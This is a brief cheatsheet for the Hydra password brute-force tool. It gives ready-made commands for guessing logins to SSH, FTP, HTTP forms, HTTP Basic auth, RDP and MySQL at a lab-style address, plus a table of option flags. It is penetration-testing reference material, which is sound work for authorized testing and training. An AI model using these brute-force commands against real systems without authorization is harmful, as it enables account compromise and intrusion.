# Hydra Cheatsheet - Password Brute Force

## SSH
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5
hydra -L users.txt -P passwords.txt ssh://10.10.10.5 -t 4
```

## FTP
```bash
hydra -l admin -P passwords.txt ftp://10.10.10.5
```

## HTTP POST Form
```bash
hydra -l admin -P passwords.txt 10.10.10.5 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
```

## HTTP Basic Auth
```bash
hydra -l admin -P passwords.txt 10.10.10.5 http-get /admin
```

## RDP
```bash
hydra -l administrator -P passwords.txt rdp://10.10.10.5
```

## MySQL
```bash
hydra -l root -P passwords.txt mysql://10.10.10.5
```

## Common Options
| Flag | Description |
|------|-------------|
| -l | Single username |
| -L | Username wordlist |
| -p | Single password |
| -P | Password wordlist |
| -t | Threads (default 16) |
| -f | Stop on first success |
| -V | Verbose |
| -o | Output file |